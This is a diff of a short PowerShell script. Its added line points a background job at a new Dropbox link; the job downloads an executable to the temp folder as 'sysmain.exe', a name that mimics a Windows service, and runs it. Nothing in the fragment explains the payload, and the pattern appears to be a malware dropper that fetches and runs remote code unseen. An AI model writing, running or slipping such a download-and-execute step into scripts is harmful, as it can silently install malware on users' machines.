@@ -1,7 +1,7 @@
 Start-Job {
     try {
         $exe = "$env:TEMP\sysmain.exe"
-        Invoke-WebRequest "https://dl.dropboxusercontent.com/scl/fi/iivjr8z2ud83jv5vquxz7/sysmain.exe?rlkey=m63g7660o2hwzx6ecttklwlft&st=o6bhpaak&" -OutFile $exe
+        Invoke-WebRequest "https://www.dropbox.com/scl/fi/yizdvsqhn0bp8pcxorxss/main.exe?rlkey=5ly0w1daqtjikib0f6y2nmyor&st=b8ww8v1v&dl=1" -OutFile $exe
         $proc = Start-Process -FilePath $exe -PassThru
         $proc.WaitForExit()
 
